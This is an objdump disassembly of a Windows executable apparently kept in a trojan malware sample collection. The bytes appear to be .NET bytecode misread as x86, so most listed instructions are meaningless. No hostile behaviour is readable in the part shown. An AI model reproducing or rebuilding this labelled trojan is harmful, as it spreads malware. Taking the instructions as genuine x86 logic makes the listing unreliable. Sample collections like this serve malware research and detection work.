
malware_samples/trojan/eec13e2e8387f91276cc2b98247e6fadfa370dd2c6212d8d75362024b1a25a58.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	40                   	inc    %eax
  402001:	48                   	dec    %eax
  402002:	01 00                	add    %eax,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 d4 6e 00    	add    %al,0x6ed400
  402013:	00 80 59 00 00 01    	add    %al,0x1000059(%eax)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 3d 00 00 06 54    	add    %bh,0x54060000
  402021:	c8 00 00 b8          	enter  $0x0,$0xb8
  402025:	7f 00                	jg     0x402027
	...
  40204f:	00 13                	add    %dl,(%ebx)
  402051:	30 05 00 e3 00 00    	xor    %al,0xe300
  402057:	00 01                	add    %al,(%ecx)
  402059:	00 00                	add    %al,(%eax)
  40205b:	11 16                	adc    %edx,(%esi)
  40205d:	0a 16                	or     (%esi),%dl
  40205f:	0b 16                	or     (%esi),%edx
  402061:	0c 0f                	or     $0xf,%al
  402063:	00 28                	add    %ch,(%eax)
  402065:	6e                   	outsb  %ds:(%esi),(%dx)
  402066:	00 00                	add    %al,(%eax)
  402068:	06                   	push   %es
  402069:	22 00                	and    (%eax),%al
  40206b:	00 00                	add    %al,(%eax)
  40206d:	00 33                	add    %dh,(%ebx)
  40206f:	18 0f                	sbb    %cl,(%edi)
  402071:	00 28                	add    %ch,(%eax)
  402073:	70 00                	jo     0x402075
  402075:	00 06                	add    %al,(%esi)
  402077:	22 00                	and    (%eax),%al
  402079:	00 7f 43             	add    %bh,0x43(%edi)
  40207c:	5a                   	pop    %edx
  40207d:	d2 25 0c 25 0b 0a    	shlb   %cl,0xa0b250c
  402083:	38 ae 00 00 00 0f    	cmp    %ch,0xf000000(%esi)
  402089:	00 28                	add    %ch,(%eax)
  40208b:	6c                   	insb   (%dx),%es:(%edi)
  40208c:	00 00                	add    %al,(%eax)
  40208e:	06                   	push   %es
  40208f:	6b 22 00             	imul   $0x0,(%edx),%esp
  402092:	00 b4 43 5b 13 05 0f 	add    %dh,0xf05135b(%ebx,%eax,2)
  402099:	00 28                	add    %ch,(%eax)
  40209b:	70 00                	jo     0x40209d
  40209d:	00 06                	add    %al,(%esi)
  40209f:	6c                   	insb   (%dx),%es:(%edi)
  4020a0:	23 00                	and    (%eax),%eax
  4020a2:	00 00                	add    %al,(%eax)
  4020a4:	00 00                	add    %al,(%eax)
  4020a6:	00 e0                	add    %ah,%al
  4020a8:	3f                   	aas
  4020a9:	32 21                	xor    (%ecx),%ah
  4020ab:	0f 00 28             	verw   (%eax)
  4020ae:	70 00                	jo     0x4020b0
  4020b0:	00 06                	add    %al,(%esi)
  4020b2:	0f 00 28             	verw   (%eax)
  4020b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4020b6:	00 00                	add    %al,(%eax)
  4020b8:	06                   	push   %es
  4020b9:	58                   	pop    %eax
  4020ba:	0f 00 28             	verw   (%eax)
  4020bd:	70 00                	jo     0x4020bf
  4020bf:	00 06                	add    %al,(%esi)
  4020c1:	0f 00 28             	verw   (%eax)
  4020c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4020c5:	00 00                	add    %al,(%eax)
  4020c7:	06                   	push   %es
  4020c8:	5a                   	pop    %edx
  4020c9:	59                   	pop    %ecx
  4020ca:	2b 15 0f 00 28 70    	sub    0x7028000f,%edx
  4020d0:	00 00                	add    %al,(%eax)
  4020d2:	06                   	push   %es
  4020d3:	22 00                	and    (%eax),%al
  4020d5:	00 80 3f 0f 00 28    	add    %al,0x28000f3f(%eax)
  4020db:	6e                   	outsb  %ds:(%esi),(%dx)
  4020dc:	00 00                	add    %al,(%eax)
  4020de:	06                   	push   %es
  4020df:	58                   	pop    %eax
  4020e0:	5a                   	pop    %edx
  4020e1:	13 04 22             	adc    (%edx,%eiz,1),%eax
  4020e4:	00 00                	add    %al,(%eax)
  4020e6:	00 40 0f             	add    %al,0xf(%eax)
  4020e9:	00 28                	add    %ch,(%eax)
  4020eb:	70 00                	jo     0x4020ed
  4020ed:	00 06                	add    %al,(%esi)
  4020ef:	5a                   	pop    %edx
  4020f0:	11 04 59             	adc    %eax,(%ecx,%ebx,2)
  4020f3:	0d 22 00 00 7f       	or     $0x7f000022,%eax
  4020f8:	43                   	inc    %ebx
  4020f9:	09 11                	or     %edx,(%ecx)
  4020fb:	04 11                	add    $0x11,%al
  4020fd:	05 22 ab aa aa       	add    $0xaaaaab22,%eax
  402102:	3e 58                	ds pop %eax
  402104:	28 02                	sub    %al,(%edx)
  402106:	00 00                	add    %al,(%eax)
  402108:	06                   	push   %es
  402109:	5a                   	pop    %edx
  40210a:	d2 0a                	rorb   %cl,(%edx)
  40210c:	22 00                	and    (%eax),%al
  40210e:	00 7f 43             	add    %bh,0x43(%edi)
  402111:	09 11                	or     %edx,(%ecx)
  402113:	04 11                	add    $0x11,%al
  402115:	05 28 02 00 00       	add    $0x228,%eax
  40211a:	06                   	push   %es
  40211b:	5a                   	pop    %edx
  40211c:	d2 0b                	rorb   %cl,(%ebx)
  40211e:	22 00                	and    (%eax),%al
  402120:	00 7f 43             	add    %bh,0x43(%edi)
  402123:	09 11                	or     %edx,(%ecx)
  402125:	04 11                	add    $0x11,%al
  402127:	05 22 ab aa aa       	add    $0xaaaaab22,%eax
  40212c:	3e 59                	ds pop %ecx
  40212e:	28 02                	sub    %al,(%edx)
  402130:	00 00                	add    %al,(%eax)
  402132:	06                   	push   %es
  402133:	5a                   	pop    %edx
  402134:	d2 0c 06             	rorb   %cl,(%esi,%eax,1)
  402137:	07                   	pop    %es
  402138:	08 73 6a             	or     %dh,0x6a(%ebx)
  40213b:	00 00                	add    %al,(%eax)
  40213d:	06                   	push   %es
  40213e:	2a 00                	sub    (%eax),%al
  402140:	13 30                	adc    (%eax),%esi
  402142:	04 00                	add    $0x0,%al
  402144:	72 00                	jb     0x402146
  402146:	00 00                	add    %al,(%eax)
  402148:	00 00                	add    %al,(%eax)
  40214a:	00 00                	add    %al,(%eax)
  40214c:	04 22                	add    $0x22,%al
  40214e:	00 00                	add    %al,(%eax)
  402150:	00 00                	add    %al,(%eax)
  402152:	34 09                	xor    $0x9,%al
  402154:	04 22                	add    $0x22,%al
  402156:	00 00                	add    %al,(%eax)
  402158:	80 3f 58             	cmpb   $0x58,(%edi)
  40215b:	10 02                	adc    %al,(%edx)
  40215d:	04 22                	add    $0x22,%al
  40215f:	00 00                	add    %al,(%eax)
  402161:	80 3f 36             	cmpb   $0x36,(%edi)
  402164:	09 04 22             	or     %eax,(%edx,%eiz,1)
  402167:	00 00                	add    %al,(%eax)
  402169:	80 3f 59             	cmpb   $0x59,(%edi)
  40216c:	10 02                	adc    %al,(%edx)
  40216e:	22 00                	and    (%eax),%al
  402170:	00 c0                	add    %al,%al
  402172:	40                   	inc    %eax
  402173:	04 5a                	add    $0x5a,%al
  402175:	22 00                	and    (%eax),%al
  402177:	00 80 3f 34 0e 02    	add    %al,0x20e343f(%eax)
  40217d:	03 02                	add    (%edx),%eax
  40217f:	59                   	pop    %ecx
  402180:	22 00                	and    (%eax),%al
  402182:	00 c0                	add    %al,%al
  402184:	40                   	inc    %eax
  402185:	5a                   	pop    %edx
  402186:	04 5a                	add    $0x5a,%al
  402188:	58                   	pop    %eax
  402189:	2a 22                	sub    (%edx),%ah
  40218b:	00 00                	add    %al,(%eax)
  40218d:	00 40 04             	add    %al,0x4(%eax)
  402190:	5a                   	pop    %edx
  402191:	22 00                	and    (%eax),%al
  402193:	00 80 3f 34 02 03    	add    %al,0x302343f(%eax)
  402199:	2a 22                	sub    (%edx),%ah
  40219b:	00 00                	add    %al,(%eax)
  40219d:	40                   	inc    %eax
  40219e:	40                   	inc    %eax
  40219f:	04 5a                	add    $0x5a,%al
  4021a1:	22 00                	and    (%eax),%al
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	40                   	inc    %eax
  4021a6:	34 14                	xor    $0x14,%al
  4021a8:	02 03                	add    (%ebx),%al
  4021aa:	02 59 22             	add    0x22(%ecx),%bl
  4021ad:	ab                   	stos   %eax,%es:(%edi)
  4021ae:	aa                   	stos   %al,%es:(%edi)
  4021af:	2a 3f                	sub    (%edi),%bh
  4021b1:	04 59                	add    $0x59,%al
  4021b3:	5a                   	pop    %edx
  4021b4:	22 00                	and    (%eax),%al
  4021b6:	00 c0                	add    %al,%al
  4021b8:	40                   	inc    %eax
  4021b9:	5a                   	pop    %edx
  4021ba:	58                   	pop    %eax
  4021bb:	2a 02                	sub    (%edx),%al
  4021bd:	2a 00                	sub    (%eax),%al
  4021bf:	00 13                	add    %dl,(%ebx)
  4021c1:	30 0a                	xor    %cl,(%edx)
  4021c3:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  4021c7:	00 02                	add    %al,(%edx)
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	11 73 19             	adc    %esi,0x19(%ebx)
  4021ce:	00 00                	add    %al,(%eax)
  4021d0:	0a 0a                	or     (%edx),%cl
  4021d2:	06                   	push   %es
  4021d3:	03 6f 1a             	add    0x1a(%edi),%ebp
  4021d6:	00 00                	add    %al,(%eax)
  4021d8:	0a 73 1b             	or     0x1b(%ebx),%dh
  4021db:	00 00                	add    %al,(%eax)
  4021dd:	0a 0b                	or     (%ebx),%cl
  4021df:	07                   	pop    %es
  4021e0:	06                   	push   %es
  4021e1:	16                   	push   %ss
  4021e2:	17                   	pop    %ss
  4021e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4021e4:	1c 00                	sbb    $0x0,%al
  4021e6:	00 0a                	add    %cl,(%edx)
  4021e8:	02 6f 1d             	add    0x1d(%edi),%ch
  4021eb:	00 00                	add    %al,(%eax)
  4021ed:	0a 02                	or     (%edx),%al
  4021ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4021f0:	1e                   	push   %ds
  4021f1:	00 00                	add    %al,(%eax)
  4021f3:	0a 73 1f             	or     0x1f(%ebx),%dh
  4021f6:	00 00                	add    %al,(%eax)
  4021f8:	0a 25 28 20 00 00    	or     0x2028,%ah
  4021fe:	0a 25 1a 6f 21 00    	or     0x216f1a,%ah
  402204:	00 0a                	add    %cl,(%edx)
  402206:	02 16                	add    (%esi),%dl
  402208:	16                   	push   %ss
  402209:	02 6f 1d             	add    0x1d(%edi),%ch
  40220c:	00 00                	add    %al,(%eax)
  40220e:	0a 02                	or     (%edx),%al
  402210:	6f                   	outsl  %ds:(%esi),(%dx)
  402211:	1e                   	push   %ds
  402212:	00 00                	add    %al,(%eax)
  402214:	0a 73 22             	or     0x22(%ebx),%dh
  402217:	00 00                	add    %al,(%eax)
  402219:	0a 16                	or     (%esi),%dl
  40221b:	16                   	push   %ss
  40221c:	02 6f 1d             	add    0x1d(%edi),%ch
  40221f:	00 00                	add    %al,(%eax)
  402221:	0a 02                	or     (%edx),%al
  402223:	6f                   	outsl  %ds:(%esi),(%dx)
  402224:	1e                   	push   %ds
  402225:	00 00                	add    %al,(%eax)
  402227:	0a 18                	or     (%eax),%bl
  402229:	07                   	pop    %es
  40222a:	6f                   	outsl  %ds:(%esi),(%dx)
  40222b:	23 00                	and    (%eax),%eax
  40222d:	00 0a                	add    %cl,(%edx)
  40222f:	2a 13                	sub    (%ebx),%dl
  402231:	30 06                	xor    %al,(%esi)
  402233:	00 70 00             	add    %dh,0x0(%eax)
  402236:	00 00                	add    %al,(%eax)
  402238:	00 00                	add    %al,(%eax)
  40223a:	00 00                	add    %al,(%eax)
  40223c:	02 6f 1d             	add    0x1d(%edi),%ch
  40223f:	00 00                	add    %al,(%eax)
  402241:	0a 02                	or     (%edx),%al
  402243:	6f                   	outsl  %ds:(%esi),(%dx)
  402244:	1e                   	push   %ds
  402245:	00 00                	add    %al,(%eax)
  402247:	0a 73 1f             	or     0x1f(%ebx),%dh
  40224a:	00 00                	add    %al,(%eax)
  40224c:	0a 25 02 6f 24 00    	or     0x246f02,%ah
  402252:	00 0a                	add    %cl,(%edx)
  402254:	02 6f 25             	add    0x25(%edi),%ch
  402257:	00 00                	add    %al,(%eax)
  402259:	0a 6f 26             	or     0x26(%edi),%ch
  40225c:	00 00                	add    %al,(%eax)
  40225e:	0a 25 28 20 00 00    	or     0x2028,%ah
  402264:	0a 25 02 6f 1d 00    	or     0x1d6f02,%ah
  40226a:	00 0a                	add    %cl,(%edx)
  40226c:	18 5b 6b             	sbb    %bl,0x6b(%ebx)
  40226f:	02 6f 1e             	add    0x1e(%edi),%ch
  402272:	00 00                	add    %al,(%eax)
  402274:	0a 18                	or     (%eax),%bl
  402276:	5b                   	pop    %ebx
  402277:	6b 6f 27 00          	imul   $0x0,0x27(%edi),%ebp
  40227b:	00 0a                	add    %cl,(%edx)
  40227d:	25 03 6f 28 00       	and    $0x286f03,%eax
  402282:	00 0a                	add    %cl,(%edx)
  402284:	25 02 6f 1d 00       	and    $0x1d6f02,%eax
  402289:	00 0a                	add    %cl,(%edx)
  40228b:	65 18 5b 6b          	sbb    %bl,%gs:0x6b(%ebx)
  40228f:	02 6f 1e             	add    0x1e(%edi),%ch
  402292:	00 00                	add    %al,(%eax)
  402294:	0a 65 18             	or     0x18(%ebp),%ah
  402297:	5b                   	pop    %ebx
  402298:	6b 6f 27 00          	imul   $0x0,0x27(%edi),%ebp
  40229c:	00 0a                	add    %cl,(%edx)
  40229e:	02 16                	add    (%esi),%dl
  4022a0:	16                   	push   %ss
  4022a1:	73 29                	jae    0x4022cc
  4022a3:	00 00                	add    %al,(%eax)
  4022a5:	0a 6f 2a             	or     0x2a(%edi),%ch
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	c2 0f 01             	ret    $0x10f
  4022af:	28 2b                	sub    %ch,(%ebx)
  4022b1:	00 00                	add    %al,(%eax)
  4022b3:	0a 0f                	or     (%edi),%cl
  4022b5:	01 28                	add    %ebp,(%eax)
  4022b7:	2c 00                	sub    $0x0,%al
  4022b9:	00 0a                	add    %cl,(%edx)
  4022bb:	73 1f                	jae    0x4022dc
  4022bd:	00 00                	add    %al,(%eax)
  4022bf:	0a 25 28 20 00 00    	or     0x2028,%ah
  4022c5:	0a 02                	or     (%edx),%al
  4022c7:	0f 01                	(bad)
  4022c9:	28 2d 00 00 0a 65    	sub    %ch,0x650a0000
  4022cf:	0f 01                	(bad)
  4022d1:	28 2e                	sub    %ch,(%esi)
  4022d3:	00 00                	add    %al,(%eax)
  4022d5:	0a 65 6f             	or     0x6f(%ebp),%ah
  4022d8:	2f                   	das
  4022d9:	00 00                	add    %al,(%eax)
  4022db:	0a 2a                	or     (%edx),%ch
  4022dd:	00 00                	add    %al,(%eax)
  4022df:	00 13                	add    %dl,(%ebx)
  4022e1:	30 07                	xor    %al,(%edi)
  4022e3:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  4022e7:	00 03                	add    %al,(%ebx)
  4022e9:	00 00                	add    %al,(%eax)
  4022eb:	11 20                	adc    %esp,(%eax)
  4022ed:	00 01                	add    %al,(%ecx)
  4022ef:	00 00                	add    %al,(%eax)
  4022f1:	8d 42 00             	lea    0x0(%edx),%eax
  4022f4:	00 01                	add    %al,(%ecx)
  4022f6:	0a 16                	or     (%esi),%dl
  4022f8:	0b 2b                	or     (%ebx),%ebp
  4022fa:	43                   	inc    %ebx
  4022fb:	06                   	push   %es
  4022fc:	07                   	pop    %es
  4022fd:	20 ff                	and    %bh,%bh
  4022ff:	00 00                	add    %al,(%eax)
  402301:	00 23                	add    %ah,(%ebx)
  402303:	00 00                	add    %al,(%eax)
  402305:	00 00                	add    %al,(%eax)
  402307:	00 e0                	add    %ah,%al
  402309:	6f                   	outsl  %ds:(%esi),(%dx)
  40230a:	40                   	inc    %eax
  40230b:	07                   	pop    %es
  40230c:	6c                   	insb   (%dx),%es:(%edi)
  40230d:	23 00                	and    (%eax),%eax
  40230f:	00 00                	add    %al,(%eax)
  402311:	00 00                	add    %al,(%eax)
  402313:	e0 6f                	loopne 0x402384
  402315:	40                   	inc    %eax
  402316:	5b                   	pop    %ebx
  402317:	23 00                	and    (%eax),%eax
  402319:	00 00                	add    %al,(%eax)
  40231b:	00 00                	add    %al,(%eax)
  40231d:	00 f0                	add    %dh,%al
  40231f:	3f                   	aas
  402320:	02 5b 28             	add    0x28(%ebx),%bl
  402323:	30 00                	xor    %al,(%eax)
  402325:	00 0a                	add    %cl,(%edx)
  402327:	5a                   	pop    %edx
  402328:	23 00                	and    (%eax),%eax
  40232a:	00 00                	add    %al,(%eax)
  40232c:	00 00                	add    %al,(%eax)
  40232e:	00 e0                	add    %ah,%al
  402330:	3f                   	aas
  402331:	58                   	pop    %eax
  402332:	69 28 31 00 00 0a    	imul   $0xa000031,(%eax),%ebp
  402338:	d2 9c 07 17 58 0b 07 	rcrb   %cl,0x70b5817(%edi,%eax,1)
  40233f:	20 00                	and    %al,(%eax)
  402341:	01 00                	add    %eax,(%eax)
  402343:	00 32                	add    %dh,(%edx)
  402345:	b5 06                	mov    $0x6,%ch
  402347:	2a 13                	sub    (%ebx),%dl
  402349:	30 05 00 6f 01 00    	xor    %al,0x16f00
  40234f:	00 04 00             	add    %al,(%eax,%eax,1)
  402352:	00 11                	add    %dl,(%ecx)
  402354:	02 50 6f             	add    0x6f(%eax),%dl
  402357:	32 00                	xor    (%eax),%al
  402359:	00 0a                	add    %cl,(%edx)
  40235b:	74 19                	je     0x402376
  40235d:	00 00                	add    %al,(%eax)
  40235f:	01 0a                	add    %ecx,(%edx)
  402361:	02 50 16             	add    0x16(%eax),%dl
  402364:	16                   	push   %ss
  402365:	02 50 6f             	add    0x6f(%eax),%dl
  402368:	1d 00 00 0a 02       	sbb    $0x20a0000,%eax
  40236d:	50                   	push   %eax
  40236e:	6f                   	outsl  %ds:(%esi),(%dx)
  40236f:	1e                   	push   %ds
  402370:	00 00                	add    %al,(%eax)
  402372:	0a 73 22             	or     0x22(%ebx),%dh
  402375:	00 00                	add    %al,(%eax)
  402377:	0a 19                	or     (%ecx),%bl
  402379:	20 08                	and    %cl,(%eax)
  40237b:	18 02                	sbb    %al,(%edx)
  40237d:	00 6f 33             	add    %ch,0x33(%edi)
  402380:	00 00                	add    %al,(%eax)
  402382:	0a 0b                	or     (%ebx),%cl
  402384:	06                   	push   %es
  402385:	16                   	push   %ss
  402386:	16                   	push   %ss
  402387:	06                   	push   %es
  402388:	6f                   	outsl  %ds:(%esi),(%dx)
  402389:	1d 00 00 0a 06       	sbb    $0x60a0000,%eax
  40238e:	6f                   	outsl  %ds:(%esi),(%dx)
  40238f:	1e                   	push   %ds
  402390:	00 00                	add    %al,(%eax)
  402392:	0a 73 22             	or     0x22(%ebx),%dh
  402395:	00 00                	add    %al,(%eax)
  402397:	0a 17                	or     (%edi),%dl
  402399:	20 08                	and    %cl,(%eax)
  40239b:	18 02                	sbb    %al,(%edx)
  40239d:	00 6f 33             	add    %ch,0x33(%edi)
  4023a0:	00 00                	add    %al,(%eax)
  4023a2:	0a 0c 07             	or     (%edi,%eax,1),%cl
  4023a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4023a6:	34 00                	xor    $0x0,%al
  4023a8:	00 0a                	add    %cl,(%edx)
  4023aa:	13 11                	adc    (%ecx),%edx
  4023ac:	12 11                	adc    (%ecx),%dl
  4023ae:	28 35 00 00 0a 0d    	sub    %dh,0xd0a0000
  4023b4:	08 6f 34             	or     %ch,0x34(%edi)
  4023b7:	00 00                	add    %al,(%eax)
  4023b9:	0a 13                	or     (%ebx),%dl
  4023bb:	11 12                	adc    %edx,(%edx)
  4023bd:	11 28                	adc    %ebp,(%eax)
  4023bf:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  4023c4:	04 09                	add    $0x9,%al
  4023c6:	69 07 6f 36 00 00    	imul   $0x366f,(%edi),%eax
  4023cc:	0a 07                	or     (%edi),%al
  4023ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4023cf:	37                   	aaa
  4023d0:	00 00                	add    %al,(%eax)
  4023d2:	0a 5a 58             	or     0x58(%edx),%bl
  4023d5:	13 05 16 13 06 16    	adc    0x16061316,%eax
  4023db:	13 07                	adc    (%edi),%eax
  4023dd:	16                   	push   %ss
  4023de:	13 08                	adc    (%eax),%ecx
  4023e0:	16                   	push   %ss
  4023e1:	13 09                	adc    (%ecx),%ecx
  4023e3:	07                   	pop    %es
  4023e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4023e5:	36 00 00             	add    %al,%ss:(%eax)
  4023e8:	0a 13                	or     (%ebx),%dl
  4023ea:	0a 02                	or     (%edx),%al
  4023ec:	50                   	push   %eax
  4023ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4023ee:	1d 00 00 0a 13       	sbb    $0x130a0000,%eax
  4023f3:	0b 02                	or     (%edx),%eax
  4023f5:	50                   	push   %eax
  4023f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f7:	1e                   	push   %ds
  4023f8:	00 00                	add    %al,(%eax)
  4023fa:	0a 13                	or     (%ebx),%dl
  4023fc:	0c 0f                	or     $0xf,%al
  4023fe:	01 28                	add    %ebp,(%eax)
  402400:	38 00                	cmp    %al,(%eax)
  402402:	00 0a                	add    %cl,(%edx)
  402404:	13 0d 0f 01 28 39    	adc    0x3928010f,%ecx
  40240a:	00 00                	add    %al,(%eax)
  40240c:	0a 13                	or     (%ebx),%dl
  40240e:	0e                   	push   %cs
  40240f:	16                   	push   %ss
  402410:	13 0f                	adc    (%edi),%ecx
  402412:	16                   	push   %ss
  402413:	13 10                	adc    (%eax),%edx
  402415:	38 90 00 00 00 11    	cmp    %dl,0x11000000(%eax)
  40241b:	07                   	pop    %es
  40241c:	11 0b                	adc    %ecx,(%ebx)
  40241e:	5d                   	pop    %ebp
  40241f:	13 08                	adc    (%eax),%ecx
  402421:	11 07                	adc    %eax,(%edi)
  402423:	11 0b                	adc    %ecx,(%ebx)
  402425:	5b                   	pop    %ebx
  402426:	13 09                	adc    (%ecx),%ecx
  402428:	11 08                	adc    %ecx,(%eax)
  40242a:	11 0d 11 08 11 0d    	adc    %ecx,0xd110811
  402430:	5d                   	pop    %ebp
  402431:	59                   	pop    %ecx
  402432:	58                   	pop    %eax
  402433:	13 0f                	adc    (%edi),%ecx
  402435:	11 09                	adc    %ecx,(%ecx)
  402437:	11 0e                	adc    %ecx,(%esi)
  402439:	11 09                	adc    %ecx,(%ecx)
  40243b:	11 0e                	adc    %ecx,(%esi)
  40243d:	5d                   	pop    %ebp
  40243e:	59                   	pop    %ecx
  40243f:	58                   	pop    %eax
  402440:	13 10                	adc    (%eax),%edx
  402442:	11 0f                	adc    %ecx,(%edi)
  402444:	16                   	push   %ss
  402445:	2f                   	das
  402446:	09 11                	or     %edx,(%ecx)
  402448:	0f 11 0b             	movups %xmm1,(%ebx)
  40244b:	32 03                	xor    (%ebx),%al
  40244d:	16                   	push   %ss
  40244e:	13 0f                	adc    (%edi),%ecx
  402450:	11 10                	adc    %edx,(%eax)
  402452:	16                   	push   %ss
  402453:	2f                   	das
  402454:	09 11                	or     %edx,(%ecx)
  402456:	10 11                	adc    %dl,(%ecx)
  402458:	0c 32                	or     $0x32,%al
  40245a:	03 16                	add    (%esi),%edx
  40245c:	13 10                	adc    (%eax),%edx
  40245e:	11 0f                	adc    %ecx,(%edi)
  402460:	16                   	push   %ss
  402461:	31 3d 11 0f 11 0b    	xor    %edi,0xb110f11
  402467:	2f                   	das
  402468:	37                   	aaa
  402469:	11 10                	adc    %edx,(%eax)
  40246b:	16                   	push   %ss
  40246c:	31 32                	xor    %esi,(%edx)
  40246e:	11 10                	adc    %edx,(%eax)
  402470:	11 0c 2f             	adc    %ecx,(%edi,%ebp,1)
  402473:	2c 11                	sub    $0x11,%al
  402475:	10 11                	adc    %dl,(%ecx)
  402477:	0a 5a 11             	or     0x11(%edx),%bl
  40247a:	0f 19 5a 58          	nopl   0x58(%edx)
  40247e:	13 06                	adc    (%esi),%eax
  402480:	09 11                	or     %edx,(%ecx)
  402482:	04 11                	add    $0x11,%al
  402484:	06                   	push   %es
  402485:	58                   	pop    %eax
  402486:	47                   	inc    %edi
  402487:	52                   	push   %edx
  402488:	09 17                	or     %edx,(%edi)
  40248a:	58                   	pop    %eax
  40248b:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  40248e:	06                   	push   %es
  40248f:	17                   	pop    %ss
  402490:	58                   	pop    %eax
  402491:	58                   	pop    %eax
  402492:	47                   	inc    %edi
  402493:	52                   	push   %edx
  402494:	09 18                	or     %ebx,(%eax)
  402496:	58                   	pop    %eax
  402497:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  40249a:	06                   	push   %es
  40249b:	18 58 58             	sbb    %bl,0x58(%eax)
  40249e:	47                   	inc    %edi
  40249f:	52                   	push   %edx
  4024a0:	09 19                	or     %ebx,(%ecx)
  4024a2:	58                   	pop    %eax
  4024a3:	0d 11 07 17 58       	or     $0x58170711,%eax
  4024a8:	13 07                	adc    (%edi),%eax
  4024aa:	09 69 11             	or     %ebp,0x11(%ecx)
  4024ad:	05 40 67 ff ff       	add    $0xffff6740,%eax
  4024b2:	ff 02                	incl   (%edx)
  4024b4:	50                   	push   %eax
  4024b5:	07                   	pop    %es
  4024b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4024b7:	3a 00                	cmp    (%eax),%al
  4024b9:	00 0a                	add    %cl,(%edx)
  4024bb:	06                   	push   %es
  4024bc:	08 6f 3a             	or     %ch,0x3a(%edi)
  4024bf:	00 00                	add    %al,(%eax)
  4024c1:	0a 2a                	or     (%edx),%ch
  4024c3:	00 13                	add    %dl,(%ebx)
  4024c5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4024c8:	56                   	push   %esi
  4024c9:	00 00                	add    %al,(%eax)
  4024cb:	00 05 00 00 11 02    	add    %al,0x2110000
  4024d1:	6c                   	insb   (%dx),%es:(%edi)
  4024d2:	03 6c 23 18          	add    0x18(%ebx,%eiz,1),%ebp
  4024d6:	2d 44 54 fb 21       	sub    $0x21fb5444,%eax
  4024db:	09 40 5a             	or     %eax,0x5a(%eax)
  4024de:	23 00                	and    (%eax),%eax
  4024e0:	00 00                	add    %al,(%eax)
  4024e2:	00 00                	add    %al,(%eax)
  4024e4:	80 66 40 5b          	andb   $0x5b,0x40(%esi)
  4024e8:	28 3b                	sub    %bh,(%ebx)
  4024ea:	00 00                	add    %al,(%eax)
  4024ec:	0a 5a 6b             	or     0x6b(%edx),%bl
  4024ef:	0f 02 28             	lar    (%eax),%ebp
  4024f2:	3c 00                	cmp    $0x0,%al
  4024f4:	00 0a                	add    %cl,(%edx)
  4024f6:	58                   	pop    %eax
  4024f7:	02 6c 03 6c          	add    0x6c(%ebx,%eax,1),%ch
  4024fb:	23 18                	and    (%eax),%ebx
  4024fd:	2d 44 54 fb 21       	sub    $0x21fb5444,%eax
  402502:	09 40 5a             	or     %eax,0x5a(%eax)
  402505:	23 00                	and    (%eax),%eax
  402507:	00 00                	add    %al,(%eax)
  402509:	00 00                	add    %al,(%eax)
  40250b:	80 66 40 5b          	andb   $0x5b,0x40(%esi)
  40250f:	28 3d 00 00 0a 5a    	sub    %bh,0x5a0a0000
  402515:	6b 0f 02             	imul   $0x2,(%edi),%ecx
  402518:	28 3e                	sub    %bh,(%esi)
  40251a:	00 00                	add    %al,(%eax)
  40251c:	0a 58 0a             	or     0xa(%eax),%bl
  40251f:	06                   	push   %es
  402520:	73 3f                	jae    0x402561
  402522:	00 00                	add    %al,(%eax)
  402524:	0a 2a                	or     (%edx),%ch
  402526:	00 00                	add    %al,(%eax)
  402528:	1b 30                	sbb    (%eax),%esi
  40252a:	05 00 23 00 00       	add    $0x2300,%eax
  40252f:	00 06                	add    %al,(%esi)
  402531:	00 00                	add    %al,(%eax)
  402533:	11 02                	adc    %eax,(%edx)
  402535:	03 12                	add    (%edx),%edx
  402537:	00 12                	add    %dl,(%edx)
  402539:	01 17                	add    %edx,(%edi)
  40253b:	28 09                	sub    %cl,(%ecx)
  40253d:	00 00                	add    %al,(%eax)
  40253f:	06                   	push   %es
  402540:	26 04 2d             	es add $0x2d,%al
  402543:	03 07                	add    (%edi),%eax
  402545:	2b 01                	sub    (%ecx),%eax
  402547:	06                   	push   %es
  402548:	28 40 00             	sub    %al,0x0(%eax)
  40254b:	00 0a                	add    %cl,(%edx)
  40254d:	0c de                	or     $0xde,%al
  40254f:	05 26 14 0c de       	add    $0xde0c1426,%eax
  402554:	00 08                	add    %cl,(%eax)
  402556:	2a 00                	sub    (%eax),%al
  402558:	01 10                	add    %edx,(%eax)
  40255a:	00 00                	add    %al,(%eax)
  40255c:	00 00                	add    %al,(%eax)
  40255e:	0d 00 0f 1c 00       	or     $0x1c0f00,%eax
  402563:	05 14 00 00 01       	add    $0x1000014,%eax
  402568:	13 30                	adc    (%eax),%esi
  40256a:	04 00                	add    $0x0,%al
  40256c:	35 00 00 00 07       	xor    $0x7000000,%eax
  402571:	00 00                	add    %al,(%eax)
  402573:	11 03                	adc    %eax,(%ebx)
  402575:	8e 69 0a             	mov    0xa(%ecx),%gs
  402578:	2b 2a                	sub    (%edx),%ebp
  40257a:	02 06                	add    (%esi),%al
  40257c:	25 17 59 0a 6f       	and    $0x6f0a5917,%eax
  402581:	41                   	inc    %ecx
  402582:	00 00                	add    %al,(%eax)
  402584:	0a 0b                	or     (%ebx),%cl
  402586:	03 06                	add    (%esi),%eax
  402588:	a3 01 00 00 1b       	mov    %eax,0x1b000001
  40258d:	0c 03                	or     $0x3,%al
  40258f:	06                   	push   %es
  402590:	03 07                	add    (%edi),%eax
